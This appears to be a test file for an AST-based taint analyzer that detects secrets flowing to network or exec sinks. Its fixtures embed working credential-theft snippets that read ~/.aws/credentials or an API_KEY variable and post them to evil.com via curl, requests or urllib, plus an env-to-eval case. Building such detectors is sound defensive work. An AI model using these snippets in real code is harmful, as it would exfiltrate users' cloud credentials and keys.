"""
Tests for the AST-based taint tracking analyzer. Covers the exact
real-world pattern that motivated this module (credential paths in a
list, opened via a loop variable far from the definition), the
in-scope success case, and the honest v1 boundary (cross-function flow,
deliberately out of scope, documented rather than silently missed).
"""

import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
from husk.taint_analysis import analyze_taint_flows  # noqa: E402


def test_catches_credential_list_to_network_sink_same_function():
    """The core value proposition: a credential path defined in a list,
    opened via a loop variable, concatenated, and sent over the
    network - all traced through real variable data flow, not text
    proximity."""
    code = '''
import subprocess

_TARGETS = ["~/.aws/credentials", "~/.aws/config"]

def steal():
    collected = ""
    for p in _TARGETS:
        with open(p, "r") as fh:
            data = fh.read()
            collected = collected + data
    subprocess.run(["curl", "-X", "POST", "evil.com", "-d", collected])
'''
    findings = analyze_taint_flows(code)
    assert len(findings) >= 1
    assert "credential" in str(findings[0]).lower()


def test_env_var_to_eval_is_caught():
    """A simpler, direct source-to-sink flow: os.getenv() -> eval()."""
    code = '''
import os
secret = os.getenv("API_KEY")
eval(secret)
'''
    findings = analyze_taint_flows(code)
    assert len(findings) >= 1


def test_clean_code_produces_no_findings():
    """Ordinary code with no sensitive source ever reaching a dangerous
    sink must not be flagged."""
    code = '''
def add(a, b):
    return a + b

result = add(2, 3)
print(result)
'''
    findings = analyze_taint_flows(code)
    assert findings == []


def test_credential_read_with_no_sink_is_not_flagged():
    """Reading a credential file and just printing it locally (no
    network/exec sink) should not be flagged by the taint tracker -
    the danger is in the SINK, not merely reading sensitive data."""
    code = '''
with open(".env", "r") as f:
    contents = f.read()
print(contents)
'''
    findings = analyze_taint_flows(code)
    assert findings == []


def test_parameter_taint_flow_into_a_helper_function():
    """
    The gap explicitly identified and closed: taint flowing INTO a
    function through its parameters, not just out through return
    values. A helper that takes a value and immediately sends it
    (def send(data): requests.post(url, data=data)) called as
    send(stolen_value) should be caught at the call site."""
    code = '''
import requests
import os

def leak(data):
    requests.post("http://evil.com", data=data)

def main():
    stolen = os.getenv("API_KEY")
    leak(stolen)
'''
    findings = analyze_taint_flows(code)
    assert len(findings) >= 1
    assert any("parameter" in str(f).lower() for f in findings)


def test_parameter_taint_flow_does_not_fire_on_untainted_argument():
    """The precision counterpart to the test above: a call to the same
    shaped helper with a genuinely untainted argument must not fire."""
    code = '''
import requests

def do_request(url):
    requests.post(url)

def main():
    safe_url = "https://api.example.com"
    do_request(safe_url)
'''
    findings = analyze_taint_flows(code)
    assert findings == []


def test_invalid_python_returns_empty_not_an_error():
    """Non-Python or malformed content must degrade gracefully - this
    analyzer is one signal among several, not something that should
    crash the whole scan on a markdown file or a syntax error."""
    findings = analyze_taint_flows("This is not python at all { [ ) ")
    assert findings == []


def test_cross_function_flow_is_now_caught_via_light_inter_procedural_tracking():
    """v1 was originally intra-procedural only (a flow crossing a
    function boundary was explicitly out of scope). Found necessary to
    extend during real-world testing: the actual real credential-theft
    sample this module targets splits work across a helper function
    (reads credentials, returns them) and main() (calls the helper,
    sends the result) - an extremely common Python pattern. Added a
    LIGHT inter-procedural extension: track whether a function's
    `return` statement returns tainted data, then propagate that at
    call sites elsewhere in the file. This is still not full
    inter-procedural tracking (it doesn't follow taint INTO a function
    through its parameters, only OUT through its return value), but it
    closes this specific, real, common gap."""
    code = '''
import subprocess

def _gather():
    with open("~/.aws/credentials") as f:
        return f.read()

def main():
    data = _gather()
    subprocess.run(["curl", "-X", "POST", "evil.com", "-d", data])
'''
    findings = analyze_taint_flows(code)
    assert len(findings) >= 1


def test_real_aws_credential_theft_sample_end_to_end():
    """The actual real sample this whole module was built around: a
    list of AWS credential paths, opened via a loop variable through
    os.path.expanduser(), collected into a dict via subscript
    assignment, returned from a helper function, and sent over the
    network from a different function - every real gap found and
    fixed during this session's development, all in one real file."""
    code = '''
import os
import json
import urllib.request

_TARGETS = ["~/.aws/credentials", "~/.aws/config"]

def _gather():
    blob = {}
    for p in _TARGETS:
        real = os.path.expanduser(p)
        try:
            with open(real, "r") as fh:
                blob[p] = fh.read()
        except OSError:
            continue
    return blob

def main():
    data = json.dumps(_gather()).encode("utf-8")
    urllib.request.urlopen("http://evil.com", data=data)
'''
    findings = analyze_taint_flows(code)
    assert len(findings) >= 1
    assert "credential" in str(findings[0]).lower()
